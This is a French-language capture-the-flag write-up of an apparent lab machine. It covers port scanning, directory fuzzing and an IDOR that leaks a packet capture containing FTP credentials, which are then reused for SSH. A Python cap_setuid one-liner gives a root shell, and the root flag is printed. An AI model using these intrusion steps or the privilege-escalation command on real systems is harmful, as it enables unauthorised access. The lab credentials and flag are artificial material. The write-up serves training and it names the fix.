- Scan
  ```csharp
  ┌──(rogue㉿rogue)-[~]
  └─$ sudo nmap -sC -sV 10.129.208.96
  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
  |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
  |_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
  80/tcp open  http    Gunicorn
  |_http-server-header: gunicorn
  |_http-title: Security Dashboard
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  ```
- Fuzzing

  ```csharp
  ┌──(rogue㉿rogue)-[~]
  └─$ ffuf -u http://10.129.208.96/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404

          /'___\  /'___\           /'___\
         /\ \__/ /\ \__/  __  __  /\ \__/
         \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
          \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
           \ \_\   \ \_\  \ \____/  \ \_\
            \/_/    \/_/   \/___/    \/_/

         v2.1.0-dev
  ________________________________________________

   :: Method           : GET
   :: URL              : http://10.129.208.96/FUZZ
   :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
   :: Follow redirects : false
   :: Calibration      : false
   :: Timeout          : 10
   :: Threads          : 40
   :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
   :: Filter           : Response status: 404
  ________________________________________________

                          [Status: 200, Size: 19386, Words: 8716, Lines: 389, Duration: 326ms]
  data                    [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 249ms]
  ip                      [Status: 200, Size: 17446, Words: 7275, Lines: 355, Duration: 304ms]
  netstat                 [Status: 200, Size: 32615, Words: 15731, Lines: 488, Duration: 246ms]
  :: Progress: [4614/4614] :: Job [1/1] :: 129 req/sec :: Duration: [0:00:33] :: Errors: 0 ::

  ```

- Reconnaissance
  Première page
  ![image.png](attachment:0751008e-ac42-4f18-a1a8-2f0325c16cd7:image.png)
  Vulnérabilité IDOR détectée
  ![image.png](attachment:40aa2716-e49d-4b90-94ed-a67829e0da16:image.png)
  ![image.png](attachment:66329d71-5281-41a6-9ae4-3a8c363112cc:image.png)
  Téléchargement de la capture 0
  ![image.png](attachment:b4cadf72-ae15-4317-bc3c-8c6d350f1641:image.png)
  On a des credentials FTP **nathan:Buck3tH4TF0RM3!**
  Par FTP :
  ```csharp
  ┌──(rogue㉿rogue)-[~]
  └─$ ftp 10.129.208.96
  Connected to 10.129.208.96.
  220 (vsFTPd 3.0.3)
  Name (10.129.208.96:rogue): nathan
  331 Please specify the password.
  Password:
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> ls
  229 Entering Extended Passive Mode (|||23213|)
  150 Here comes the directory listing.
  -r--------    1 1001     1001           33 Jul 02 12:11 user.txt
  226 Directory send OK.
  ftp> get user.txt
  local: user.txt remote: user.txt
  229 Entering Extended Passive Mode (|||37442|)
  150 Opening BINARY mode data connection for user.txt (33 bytes).
  100% |***********************************************************************************************************************************************************************************************|    33        0.10 KiB/s    00:00 ETA
  226 Transfer complete.
  33 bytes received in 00:01 (0.02 KiB/s)
  ftp> cat user.txt

  ```
  Par SSH avec les cred trouvés:
  ```csharp
  ┌──(rogue㉿rogue)-[~]
  └─$ ssh nathan@10.129.208.96
  The authenticity of host '10.129.208.96 (10.129.208.96)' can't be established.
  ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
  This key is not known by any other names.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '10.129.208.96' (ED25519) to the list of known hosts.
  nathan@10.129.208.96's password:
  Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
  Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
  nathan@cap:~$
  nathan@cap:~$ ls
  user.txt

  ```
- Priv Esc
  On utilise linPEAS
  ```csharp
  nathan@cap:~$ chmod +x linpeas.sh
  nathan@cap:~$ ./linpeas.sh
  ```
  ```csharp
  ╔══════════╣ Capabilities
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
  ══╣ Current shell capabilities
  Files with capabilities (limited to 50):
  /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
  ```
  La faille vient du binaire `/usr/bin/python3.8` qui possède des _capabilities_ dangereuses, visibles avec `getcap -r / 2>/dev/null`, notamment `cap_setuid+eip`, permettant à un utilisateur non privilégié de changer son UID en root via Python. En exécutant la commande `python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`, l’utilisateur `nathan` obtient un shell root sans mot de passe ni exploit mémoire. Cela équivaut à un binaire SUID root déguisé, ce qui permet ensuite de lire le fichier `/root/root.txt`. Pour corriger cette faille, il suffit de retirer les capabilities dangereuses avec `sudo setcap -r /usr/bin/python3.8`.
  ```csharp
  nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
  root@cap:~# ls
  index.html  linpeas.sh  snap  user.txt
  root@cap:~# cd /root/
  root@cap:/root# ls
  root.txt  snap
  root@cap:/root# cat root.txt
  51ad43dcba0e0d9135672f54967d3d04

  ```
